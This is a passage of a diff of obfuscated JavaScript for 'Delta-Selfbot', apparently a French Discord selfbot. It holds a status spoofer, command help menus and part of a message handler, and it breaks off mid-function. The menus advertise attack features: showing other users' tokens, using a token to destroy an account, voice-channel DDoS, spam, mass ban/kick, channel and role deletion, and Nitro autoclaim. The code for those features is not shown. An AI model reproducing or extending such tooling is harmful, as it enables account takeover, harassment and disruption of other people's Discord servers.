+    return _0x18f2x28[_0x18f2x26['getUTCDay']()] + ', ' + _0x18f2x26['getUTCDate']() + ' ' + _0x18f2x27[_0x18f2x26['getUTCMonth']()] + ' ' + _0x18f2x26['getUTCFullYear']() + ' at ' + _0x18f2x26['getUTCHours']() + ':' + zeros(_0x18f2x26['getUTCMinutes'](), 2) + ':' + zeros(_0x18f2x26['getUTCSeconds'](), 2) + '.' + zeros(_0x18f2x26['getUTCMilliseconds'](), 3);
+}
+
+function checkDays(_0x18f2x26) {
+    var _0x18f2x2a = new Date();
+    var _0x18f2x2b = _0x18f2x2a.getTime() - _0x18f2x26.getTime();
+    var _0x18f2x2c = Math.floor(_0x18f2x2b / 86400000);
+    return _0x18f2x2c + (_0x18f2x2c == 1 ? ' day' : ' days') + ' ago';
+}
+client.on('ready', function() {
+        console.log('Delta-Selfbot'.bgBlue);
+        console.log('\r\n          _____\r\n         /    /\\\\\r\n        /    /  \\\\\r\n       /    /    \\\\\r\n      /    /  /\\\\  \\\\\r\n     /    /  /  \\\\  \\\\\r\n    /    /  /\\\\   \\\\  \\\\\r\n   /    /  /  \\\\   \\\\  \\\\\r\n  /    /__/____\\\\   \\\\  \\\\\r\n /              \\\\   \\\\  \\\\\r\n/________________\\\\   \\\\  \\\\\r\n\\\\_____________________\\\\ /\r\n'.yellow);
+        console.log(('\r\n╔═════════════════════════════════╗\r\n║-->  User Name : ' + client.user.tag + '   \r\n╟─────────────────────────────────╢\r\n║-->  User id : ' + client.user.id + ' \r\n╟─────────────────────────────────╢\r\n║-->  Prefix   : ' + prefix + '                 \r\n╟─────────────────────────────────╢\r\n║-->  Users    : ' + client.guilds.map(_0x18f2x16 => {
+                        return _0x18f2x16.memberCount;
+                    })
+                .reduce((_0x18f2x14, _0x18f2x15) =>
+                    
+                    {
+                        return _0x18f2x14 + _0x18f2x15;
+                    }) + '             \r\n╟─────────────────────────────────╢\r\n║-->  Bots     : ' + client.users.filter(_0x18f2x13 =>
+                    
+                    {
+                        return _0x18f2x13.bot;
+                    })
+                .size + '                 \r\n╟─────────────────────────────────╢\r\n║-->  Channels : ' + client.channels.size + '               \r\n╟─────────────────────────────────╢\r\n║-->  Guilds   : ' + client.guilds.size + '                 \r\n╚═════════════════════════════════╝ ')
+            .bgRed);
+        if (client.user.premium > 0) {
+            console.log('Vous etes sur un compte nitro WOAW bravo ;)'.green);
+        } else {
+            console.log('Vous n\'avez pas nitro snif, ne t\'inquiète pas mon autoclaim va tout faire pour que tu en recuperes 1'.red);
+        }
     });
-}), client.on('guildDelete', _0x1beb57 => {
-    const _0x24e86e = _0x14ffc7;
-    console.log(_0x24e86e('0x185').blue), console[_0x24e86e('0x2f')](_0x24e86e('0x26b')[_0x24e86e('0x2ab')]) ^ console[_0x24e86e('0x2f')](_0x24e86e('0x1d5')[_0x24e86e('0x153')]), console.log((_0x24e86e('0x81') + _0x1beb57[_0x24e86e('0x10d')])[_0x24e86e('0x145')]), console[_0x24e86e('0x2f')](_0x24e86e('0x22e').blue);
-}), client.on('guildCreate', _0x454b2a => {
-    const _0x569518 = _0x14ffc7;
-    console.log('\x0a╔═════════════════════════════════╗'.blue), console.log(_0x569518('0x26b')[_0x569518('0x2ab')]) ^ console.log(_0x569518('0x1d5')[_0x569518('0x153')]), console.log((_0x569518('0x1ea') + _0x454b2a[_0x569518('0x10d')])[_0x569518('0x145')]), console[_0x569518('0x2f')](_0x569518('0x22e')[_0x569518('0x153')]);
-}), client.login(token);
+client.on('ready', function()
+    
+    {
+        if (client.user.bot) {
+            console.log(('' + client.user.username + ' est un robot je ne peux pas charger le profil desolé :/')
+                .red);
+            process.exit(1);
+        } else {
+            console.log(('' + client.user.username + ' boup bip boup super tu n\'est pas un robot ^^!')
+                .green);
+        }
+    });
+var uuid = () => {
+        return ([10000000] + -1000 + -4000 + -8000 + -100000000000)['replace'](/[018]/g, _0x18f2x14 => {
+            return (_0x18f2x14 ^ Math['random']() * 16 >> _0x18f2x14 / 4)
+                .toString(16);
+        });
+    };
+client.on('ready', function() {
+    rpcGenerator.getRpcImage('768215201312014376', '1024px-uvsun_trace_big').then(_0x18f2x2e => {
+        rpcGenerator.getRpcImage('768215201312014376', 'delta').then(_0x18f2x2f => {
+            let _0x18f2x30 = new rpcGenerator.Rpc()
+                .setName('Delta-Selfbot')
+                .setUrl('https://www.twitch.tv/OGAGAL_risita')
+                .setType('PLAYING')
+                .setApplicationId('768215201312014376')
+                .setDetails('Delta Selfbot')
+                .setAssetsLargeImage(_0x18f2x2f.id)
+                .setAssetsSmallImage(_0x18f2x2e.id)
+                .setAssetsLargeText('Delta')
+                .setState('Utilise le Delta Selfbot')
+                .setStartTimestamp(Date.now())
+                .setParty({
+                    id: ([10000000] + -1000 + -4000 + -8000 + -100000000000).replace(/[018]/g, _0x18f2x14 => {
+                        return (_0x18f2x14 ^ Math['random']() * 16 >> _0x18f2x14 / 4)
+                            .toString(16);
+                    })
+                });
+            client.user.setPresence(_0x18f2x30.toDiscord())
+                .catch(console.error);
+        });
+    });
+});
+
+let cmd = new Discord.RichEmbed();
+cmd.setTimestamp()
+        .setColor(color)
+        .setTitle('**Liste des commandes**')
+        .addField('**Commande Help**', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`')
+        .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`, `backup load`, `backup delete`, `backup purge`, `backup info`')
+        .addField('**Commandes Fun** :joy:: ', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`')
+        .addField('**Commandes Moderation** :tools:: ', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
+        .addField('**Commandes Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
+        .addField('**Commandes Hack** :skull_and_crossbones: :', '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`, `spam`, `stop spam`')
+        .addField('**Commandes Utile** :globe_with_meridians: :', '`grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
+        .addField('**Commandes Statut** :performing_arts: :', '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_hack = new Discord.RichEmbed()
+        .setTimestamp()
+        .setColor(color)
+        .setTitle('**Pannel de Help Hacking**')
+        .addField('**' + prefix + 'ddos voc**', '`Lance une attaque ddos sur les channels vocal`')
+        .addField('**' + prefix + 'ddos-stop**', '`Stop une attaque ddos sur les channels vocal`')
+        .addField('**' + prefix + 'token (@user)**', '`Affiche le token d\'un utilisateur`')
+        .addField('**' + prefix + 'check token (token)**', '`Check si un token est valide`')
+        .addField('**' + prefix + 'info token (token)**', '`Affiche les informations d\'un utilisateur grace a un token`')
+        .addField('**' + prefix + 'fuck token (token)**', '`Detruit le compte d\'un utilisateur grace a un token`')
+        .addField('**' + prefix + 'spam (text)**', '`Spam un text`')
+        .addField('**' + prefix + 'stop spam**', '`Arrete le spam`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help = new Discord.RichEmbed();
+help.setTimestamp()
+        .setColor(color)
+        .setTitle('🌙**Pannel de Help**🌙')
+        .addField('**' + prefix + 'cmd**', '`Liste des commandes`')
+        .addField('**' + prefix + 'help fun**', '`Affiche les commandes fun` :joy:')
+        .addField('**' + prefix + 'help backup**', '`Affiche les commandes backups` :gear:')
+        .addField('**' + prefix + 'help moderation**', '`Affiche les commandes moderation` :tools:')
+        .addField('**' + prefix + 'help utile**', '`Affiche les commandes info` :globe_with_meridians:')
+        .addField('**' + prefix + 'help nsfw**', '`Affiche les commandes nsfw` :underage:')
+        .addField('**' + prefix + 'help hack**', '`Affiche les commandes hack` :skull_and_crossbones:')
+        .addField('**' + prefix + 'help statut**', '`Affiche les commandes statut` :performing_arts:')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_statut = new Discord.RichEmbed()
+        .setColor(color)
+        .setTitle('**Pannel de Help Statut** :performing_arts: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'rocket league (text)**', '`Met un statut Rocket League`')
+        .addField('**' + prefix + 'spotify (text)**', '`Met un statut Spofity`')
+        .addField('**' + prefix + 'fortnite (text)**', '`Met un statut Fortnite`')
+        .addField('**' + prefix + 'among us (text)**', '`Met un statut Among us`')
+        .addField('**' + prefix + 'gucci (text)**', '`Met un statut Gucci`')
+        .addField('**' + prefix + 'lacoste (text)**', '`Met un statut Lacoste`')
+        .addField('**' + prefix + 'nike (text)**', '`Met un statut Nike`')
+        .addField('**' + prefix + 'google (text)**', '`Met un statut Google`')
+        .addField('**' + prefix + 'skype (text)**', '`Met un statut Skype`')
+        .addField('**' + prefix + 'snapchat (text)**', '`Met un statut Snapchat`')
+        .addField('**' + prefix + 'facebook (text)**', '`Met un statut Facebook`')
+        .addField('**' + prefix + 'tiktok (text)**', '`Met un statut Tiktok`')
+        .addField('**' + prefix + 'twitter (text)**', '`Met un statut Twitter`')
+        .addField('**' + prefix + 'minecraft (text)**', '`Met un statut Minecraft`')
+        .addField('**' + prefix + 'instagram (text)**', '`Met un statut Instagram`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_statut2 = new Discord.RichEmbed()
+        .setColor(color)
+        .setTitle('**Pannel de Help Statut** :performing_arts: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'youtube (text)**', '`Met un statut Youtube`')
+        .addField('**' + prefix + 'tokyo ghoul (text)**', '`Met un statut Tokyo Ghoul`')
+        .addField('**' + prefix + 'hunter x hunter (text)**', '`Met un statut Hunter x Hunter`')
+        .addField('**' + prefix + 'naruto (text)**', '`Met un statut Naruto`')
+        .addField('**' + prefix + 'clash of clan (text)**', '`Met un statut Clash of Clan`')
+        .addField('**' + prefix + 'clash royal (text)**', '`Met un statut Clash Royal`')
+        .addField('**' + prefix + 'tinder (text)**', '`Met un statut Tinder`')
+        .addField('**' + prefix + 'pornhub (text)**', '`Met un statut Pornhub`')
+        .addField('**' + prefix + 'roblox (text)**', '`Met un statut Roblox`')
+        .addField('**' + prefix + 'csgo (text)**', '`Met un statut Csgo`')
+        .addField('**' + prefix + 'apex (text)**', '`Met un statut Apex`')
+        .addField('**' + prefix + 'badlion (text)**', '`Met un statut Badlion`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_backup = new Discord.RichEmbed()
+        .setColor(color)
+        .setTitle('**Pannel de Help Backup** :gear: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'backup create**', '`Créé une backup d\'un serveur`')
+        .addField('**' + prefix + 'backup friend**', '`Créé une backup de tous tes amis`')
+        .addField('**' + prefix + 'backup load (id)**', '`Charge une backup`')
+        .addField('**' + prefix + 'backup delete (id)**', '`Surppime une backup`')
+        .addField('**' + prefix + 'backup purge**', '`Supprime toutes tes backups`')
+        .addField('**' + prefix + 'backup info (id)**', '`Envoie les informations d\'une backup`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_fun = new Discord.RichEmbed()
+        .setTimestamp()
+        .setColor(color)
+        .setTitle('**Pannel de Help Fun** :joy: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'avatar (@user)**', '`Affiche l\'avatar d\'un membre`')
+        .addField('**' + prefix + 'lovecalc (@user)**', '`Test d\'amour`')
+        .addField('**' + prefix + 'nitro**', '`Genere un nitro random`')
+        .addField('**' + prefix + '8ball (text)**', '`Pose une question`')
+        .addField('**' + prefix + 'say (text)**', '`Affiche un text en embed`')
+        .addField('**' + prefix + 'fight (@user)**', '`Bat toi avec un utilisateur`')
+        .addField('**' + prefix + 'boom (@user)**', '`Fait exploser un utilisateur`')
+        .addField('**' + prefix + 'rire**', '`Envoie un gif rire`')
+        .addField('**' + prefix + 'kiss (@user)**', '`Embrasse un membre`')
+        .addField('**' + prefix + 'veski (@user)**', '`Envoie un gif veski`')
+        .addField('**' + prefix + 'load**', '`Envoie un chargement`')
+        .addField('**' + prefix + 'punch (@user)**', '`Frappe un membre`')
+        .addField('**' + prefix + 'calin (@user)**', '`Fait un calin a un membre`')
+        .addField('**' + prefix + 'reverse (text)**', '`Met ton text a l\'envers`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_moderation = new Discord.RichEmbed()
+        .setTimestamp()
+        .setColor(color)
+        .setTitle('**Pannel de Help Moderation** :tools: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
+        .addField('**' + prefix + 'shutdown**', '`Eteint le selfbot`')
+        .addField('**' + prefix + 'name all**', '`Rename tout les membres d\'un serveur`')
+        .addField('**' + prefix + 'ban-all**', '`Ban tout les membres d\'un serveur`')
+        .addField('**' + prefix + 'kick-all**', '`Kick tout les membres d\'un serveur`')
+        .addField('**' + prefix + 'kick (@user)**', '`kick un membre du serveur`')
+        .addField('**' + prefix + 'ban (@user)**', '`Ban un membre du serveur`')
+        .addField('**' + prefix + 'roles list**', '`Envoie la liste de tout les roles d\'un serveur`')
+        .addField('**' + prefix + 'channels list**', '`Envoie la liste de tout les channels d\'un serveur`')
+        .addField('**' + prefix + 'purge**', '`Supprime tout les messages`')
+        .addField('**' + prefix + 'delete all channel**', '`Supprime tout les salons d\'un serveur`')
+        .addField('**' + prefix + 'delete all role**', '`Supprime tout les roles d\'un serveur`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_info = new Discord.RichEmbed()
+        .setTimestamp()
+        .setColor(color)
+        .setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'user info (@user)**', '`Envoie les information d\'un membre du serveur`')
+        .addField('**' + prefix + 'serveur info**', '`Envoie les information du serveur`')
+        .addField('**' + prefix + 'stats**', '`Affiche les stats du selfbot`')
+        .addField('**' + prefix + 'restart**', '`Redemarre le selfbot`')
+        .addField('**' + prefix + 'reset**', '`Reset le status`')
+        .addField('**' + prefix + 'role info (@role)**', '`Envoie les informations d\'un role`')
+        .addField('**' + prefix + 'encode (text)**', '`Crypte ton text en base64`')
+        .addField('**' + prefix + 'discord**', '`Affiche votre version de discord js`')
+        .addField('**' + prefix + 'gen token**', '`Change votre token`')
+        .addField('**' + prefix + 'add emote (emote) <name>**', '`Ajoute un emoji au serveur`')
+        .addField('**' + prefix + 'emote (emote)**', '`Donne les infos tout les emojis d\'un serveur`')
+        .addField('**' + prefix + 'remove emote (emote)**', '`Supprime un emoji du serveur`')
+        .addField('**' + prefix + 'steal emote (serveur id)**', '`Ajoute tout les emojis d\'un serveur a ton serveur`')
+        .addField('**' + prefix + 'delete all emote**', '`Supprime tout les emojis du serveur`')
+        .addField('**' + prefix + 'grab pp (user)**', '`Vole la photo de profile de la personne mentionné`')
+        .addField('**' + prefix + 'check token (token)**', '`Vérifie si le token est valide`')
+        .addField('**' + prefix + 'mp friend (message)**', '`Envoie un message privé a tout tes amis`')
+        .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`Permet de changer sa maison hypesquad`')
+        .addField('**nitro autoclaim**', '`Un autoclaim est en permanance activé sur le self`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+let help_nsfw = new Discord.RichEmbed()
+        .setTimestamp()
+        .setColor(color)
+        .setTitle('**Pannel de Help nsfw** :underage: ')
+        .setDescription('[Lien du serveur discord](https://discord.gg/S5fcV64)')
+        .addField('**' + prefix + 'ass**', '`Envoie une photo de fesse`')
+        .addField('**' + prefix + '4k**', '`Envoie une image sexe en 4k`')
+        .addField('**' + prefix + 'anal**', '`Envoie un gif anal`')
+        .addField('**' + prefix + 'hentai**', '`Envoie une image/gif hentai`')
+        .addField('**' + prefix + 'nsfw-gif**', '`Envoie un gif de sexe`')
+        .addField('**' + prefix + 'pussy**', '`Envoie une image de chattes`')
+        .addField('**' + prefix + 'thigh**', '`Envoie une image thigh`')
+        .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
+        .setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff')
+        .setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
+        .setFooter('Delta-Selfbot');
+client.on('message', _0x18f2x3b => {
+        let _0x18f2x3c = _0x18f2x3b;
+        var _0x18f2x3d = _0x18f2x3b.content.substring(prefix.length)
+            .split(' ');
+        var _0x18f2x3e = _0x18f2x3b.mentions.users.first();
+        if (_0x18f2x3b.channel.type === 'dm') {
+            if (_0x18f2x3c.author.bot) {
+                if (_0x18f2x3b.content.includes('discord.gg')) {
+                    let _0x18f2x3f = _0x18f2x3b.author;
+                    _0x18f2x3f.send('/!\\\\ Anti mp')
+                        .then(_0x18f2x3c =>
+
+                            {
+                                _0x18f2x3c.delete();
+                            });
+                    console.log('\n╔═════════════════════════════════╗'.blue);
+                    console.log('Log:'.red) ^ console.log('╟─────────────────────────────────╢'.blue);
+                    console.log('║--> [', '/!/ Attention'.red, ']', ('\\nle bot ' + _0x18f2x3b.author.username + ' vient de vous envoyer une invatation suspecte ' + _0x18f2x3b.content + '').green);
+                    console.log('╚═════════════════════════════════╝'.blue);
+                }
+            }
+        }
+        if (_0x18f2x3c.author.id !== client.user.id) {
+            return;
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'gucci')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'gucci')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Gucci')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Gucci')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Gucci executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Gucci**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'lacoste')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'lacoste')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Lacoste')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Lacoste')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande lacoste executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur lacoste**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'nike')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'nike')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Nike')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Nike')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Nike executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Nike**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'google')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'gogole')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Google')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Google')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande google executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur google**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'skype')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'skype')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Skype')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Skype')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Skype executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Skype**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'snapchat')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'snapchat')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Snapchat')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Snapchat')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Snapchat executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Snapchat**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'facebook')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'facebook')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Facebook')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Skype')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Facebook executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Facebook**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'tiktok')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'tiktok')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Tiktok')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Tiktok')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Tiktok executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Tiktok**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'twitter')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'twitter')
+                .then(_0x18f2x2e =>
+
+                    {
